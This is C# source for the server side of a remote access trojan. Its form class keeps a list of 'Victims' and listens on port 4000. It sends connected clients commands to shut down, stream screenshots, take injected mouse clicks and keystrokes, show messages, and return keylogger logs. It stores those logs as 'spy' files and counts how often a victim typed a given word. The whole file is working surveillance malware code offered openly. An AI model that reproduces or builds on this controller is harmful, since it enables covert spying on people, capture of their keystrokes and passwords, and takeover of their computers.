using System;
using Unit4.CollectionsLib;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Management;
using System.Text.RegularExpressions;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
namespace Server
{
    public partial class Ruler : Form
    {
        public static double y = 1;
        public List<RadioButton> RadioB = new List<RadioButton>();
        List<Client> Victims = new List<Client>();
        public static Socket connetion;
        ListViewItem[] ConnctionItem = new ListViewItem[10];
        public static bool big = false;
        static Node<Client> ConnctedC;
        static int b;
        static string[] s;
        bool camera = false;
        static bool spy = false;
        public Ruler()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            System.IO.Directory.CreateDirectory(@"C:\temp");
            Full.Hide();
            if (!Directory.Exists(@"C:\hh"))
                Directory.CreateDirectory(@"C:\hh");
            if (!Directory.Exists(@"C:\key"))
                Directory.CreateDirectory(@"C:\key");
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }
        public void TryToConnect()
        {
            Thread.Sleep(1000);
            try
            {
                Victims.Insert(null, new Client(connetion.Accept()));
            }
            catch
            {
                TryToConnect();
            }
        }
        public void CreateRB(RadioButton r)
        {

            if (this.InvokeRequired)
            {
                this.EndInvoke(this.BeginInvoke(new MethodInvoker(delegate { this.CreateRB(r); })));
            }
            else
            {
                this.Home.Controls.Add(r);
            }
        }
        public void Work()
        {
            int location = 0;
            Node<Client> FirstVictim = Victims.GetFirst();
            Node<RadioButton> FirstRB = RadioB.GetFirst();
            while (FirstVictim != null)
            {
                FirstVictim.GetInfo().sendData("GetName");
                FirstRB = RadioB.Insert(FirstRB, new RadioButton());
                FirstRB.GetInfo().SetBounds(180, 60 + (12 * location), 12, 12);
                ConnctionItem[location] = new ListViewItem((location + 1).ToString(), 0);
                string[] ConnactionArr = FirstVictim.GetInfo().GetData().Split('#');
                ConnctionItem[location].SubItems.Add(ConnactionArr[0]);
                ConnctionItem[location].SubItems.Add(ConnactionArr[1]);
                //ConnctionItem[location].SubItems.Add(ConnactionArr[2]);
                Connections.Items.Add(ConnctionItem[location]);
                CreateRB(FirstRB.GetInfo());
                FirstVictim = FirstVictim.GetNext();
                location++;
            }
        }

        private void Connect_Click(object sender, EventArgs e)
        {
            connetion = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
            connetion.Bind(new IPEndPoint(IPAddress.Any, 4000));
            connetion.Listen(10);
            Thread ConnectTry = new Thread(new ThreadStart(TryToConnect));
            ConnectTry.Start();
            Thread.Sleep(5000);
            //Node<Client> FirstVictim = null;
            //do
            //{
            //    FirstVictim = Victims.GetFirst();
            //} while (FirstVictim == null);
            Work();
        }
        private int FindRadio()
        {

            int z = 1;
            Node<RadioButton> FirstRB = RadioB.GetFirst();
            while (!FirstRB.GetInfo().Checked)
            {
                z += 1;
                FirstRB = FirstRB.GetNext();
                if (FirstRB.GetInfo() == null)
                    return -1;

            }

            return z;
        }
        private Node<Client> NodeFind(int x)
        {
            Node<Client> VTC = Victims.GetFirst();
            while (x > 1)
            {
                VTC = VTC.GetNext();
                x--;
            }
            return VTC;
        }
        public static void Sclick(int x, int y, int num)
        {
            ConnctedC.GetInfo().sendData("me#" + x.ToString() + "#" + y.ToString() + "#" + num + "#");
        }

        private void Shutdown_Click(object sender, EventArgs e)
        {
            int clientNumber = FindRadio();
            Node<Client> n = NodeFind(clientNumber);
            n.GetInfo().sendData("Shutdown");
        }

        private void Cancel_Click(object sender, EventArgs e)
        {
            int clientNumber = FindRadio();
            Node<Client> n = NodeFind(clientNumber);
            n.GetInfo().sendData("CancelShutdown");
        }
        private void ScreenWatch()
        {

            Node<Client> c = NodeFind(FindRadio());
            while (true)
            {
                if (big == false)
                    c.GetInfo().sendData("pic");
                else
                {
                    c.GetInfo().sendData("PB#" + SystemInformation.PrimaryMonitorSize.Height.ToString() + "#" + SystemInformation.PrimaryMonitorSize.Width.ToString() + "#");
                }
                string godel = c.GetInfo().GetData();

                c.GetInfo().GetPic(@"C:\temp\tempscreen0.Jpeg", godel);
                Screen.ImageLocation = (@"C:\temp\tempscreen0.Jpeg");
                if (big == true)
                    Thread.Sleep(1);

            }
        }

        private void Watch_Click(object sender, EventArgs e)
        {
            Full.Show();
            Node<Client> c = NodeFind(FindRadio());
            c.GetInfo().sendData("screen");
            string[] screen = c.GetInfo().GetData().Split('#');
            Screen.SetBounds(0, 0, int.Parse(screen[0]) / 2, int.Parse(screen[1]) / 2);
            this.Width = (int.Parse(screen[0]) / 2) + 50;
            this.Height = (int.Parse(screen[1]) / 2) + 125;
            this.Tabs.Width = (int.Parse(screen[0]) / 2) + 50;
            this.Tabs.Height = (int.Parse(screen[1]) / 2) + 125;
            Watch.SetBounds(15, Screen.Height + 50, 49, 26);

            Stop.SetBounds(188, Screen.Height + 50, 46, 26);
            Full.SetBounds(276, Screen.Height + 50, 75, 23);
            //watch = true;
            Thread WS = new Thread(new ThreadStart(ScreenWatch));
            WS.Start();
        }

        private void Stop_Click(object sender, EventArgs e)
        {
            //  watch = false;
        }
        private void Full_Click(object sender, EventArgs e)
        {
            ConnctedC = NodeFind(FindRadio());
            y = y / 8;
            Thread full = new Thread(new ThreadStart(OpenF));
            full.Start();

        }
        private void OpenF()
        {
            big = true;

            (new FullWatch()).ShowDialog();
        }
        public static void Skey(String key)
        {
            ConnctedC.GetInfo().sendData("ke#" + key);
        }

        private void Send_Click(object sender, EventArgs e)
        {
            NodeFind(FindRadio()).GetInfo().sendData("Text#" + Msg.Text + "#" + From.Text);
        }

        private void StartS_Click(object sender, EventArgs e)
        {
            Node<Client> c = NodeFind(FindRadio());
            DateTime date = DateTime.Today;
            int day = date.Day;
            int m = date.Month;
            int year = date.Year;
            string DATE = day.ToString() + "." + m.ToString() + "." + year.ToString();
                c.GetInfo().sendData("key");
                string godel = c.GetInfo().GetData();
                c.GetInfo().GetPic(@"C:\key\spy" + DATE + ".txt", godel);
                s = Directory.GetFiles(@"C:\key");
                int l = s.Length;
                for (int i = 0; i <l; i++)
                {
                    string str = File.ReadAllText(s[i]);
                    string str2 = s[i].Clone().ToString();
                    str2 = str2.Substring(10);
                    press.Text+= "            "+str2+":"+ str;
                    press.Refresh();

                }
        }

        private void Search_Click(object sender, EventArgs e)
        {
            if (Word.Text == "")
                Problem.Text = "please enter a word";
            else
            {
                string str = press.Text;
                string Aword = Word.Text;

                if (str.IndexOf(Aword) == -1)
                    Problem.Text = "the user didnt write the word " + Aword;
                else
                {
                    bool stop = false;
                    int from = 0;
                    int count = 0;
                    while (!stop)
                    {
                        if (str.IndexOf(Aword, from) != -1)
                        {
                            count++;
                            from = str.IndexOf(Aword, from) + 1;
                        }
                        else
                            stop = true;
                    }
                    Problem.Text = "the user writed the word " + Aword + " " + count + " times";
                }
            }
        }
    }
}
